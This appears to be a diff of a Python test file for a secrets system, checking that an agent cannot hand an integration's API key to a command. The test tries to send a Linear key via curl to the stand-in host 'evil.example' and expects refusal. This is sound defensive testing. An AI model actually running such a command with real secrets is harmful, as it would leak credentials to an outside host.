@@ -36,7 +36,8 @@ def test_only_you_pick_an_integrations_key_and_a_phone_never_does():
     asked = Secrets(record, actor=AGENT).request("Linear key", "for Linear")
     variable = asked.secret_fields[0]["variable"]
     Secrets(record, actor=USER).fill(asked.n, "key", "lin_api_secret_value")
-    assert refused(lambda: Secrets(record, actor=AGENT).run("Linear key", "curl", "http://evil.example")), "no command can be given a secret whose program list is empty"
+    Features(record, actor=USER).configure("linear", "key", variable)
+    assert "key of an integration" in refused(lambda: Secrets(record, actor=AGENT).run("Linear key", "curl", "http://evil.example")), "no command can be given the secret picked as the key of an integration"
     Secrets(record, actor=USER).update(asked.n, programs=["curl"])
     assert "lets commands use it" in refused(lambda: Features(record, actor=USER).configure("linear", "key", variable)), "a secret that lets commands use it is not picked as the key"
 
